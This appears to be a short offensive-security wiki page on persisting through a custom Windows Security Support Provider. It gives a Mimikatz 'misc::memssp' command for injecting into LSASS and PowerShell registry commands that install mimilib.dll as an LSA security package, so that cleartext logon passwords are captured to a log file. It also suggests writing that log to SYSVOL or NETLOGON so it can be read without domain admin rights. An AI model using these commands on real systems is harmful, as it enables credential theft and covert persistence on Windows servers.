---
description: Custom SSP (Security Support Provider)
---

# Custom SSP (Security Support Provider)

> An SSP is a DLL which provides ways for an application to obain an authenticated connection. some SSPs by Microsoft are: Kerberos, NTLM, Wdigest...

Mimikatz provides a custom SSP (mimilib.dll) that logs local logons, service/machine accounts passwords in cleartext on the target server.

**Note:** Normal SSPs continue working.

### Implement with mimikatz

Injecting it into LSASS (not stable in Windows 2016):

```bash
Invoke-Mimikatz -Command '"misc::memssp"'
```

### Implement through registry

First of all drop the "mimilib.dll" to system32 directory. Then add the following in the registry:

```bash
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select - ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

**Note 1:** The output will be at C:\Windows\System32\kiwissp.log **Note 2:** We can change the code of mimilib.dll to change the output dir, like SYSVOL or NETLOGON (so we do not need domain admin privs to read it).
